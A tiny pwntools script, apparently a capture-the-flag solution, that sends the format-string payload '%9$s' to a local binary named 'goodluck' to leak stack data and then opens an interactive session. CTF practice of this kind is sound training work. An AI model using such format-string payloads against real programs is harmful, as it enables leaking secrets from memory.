#Made by fly_autumn
#fmt x64 canary + nx
from pwn import *
p = process("./goodluck")

offset = 9
payload = "%{}$s".format(offset)
p.sendline(payload)

p.interactive()
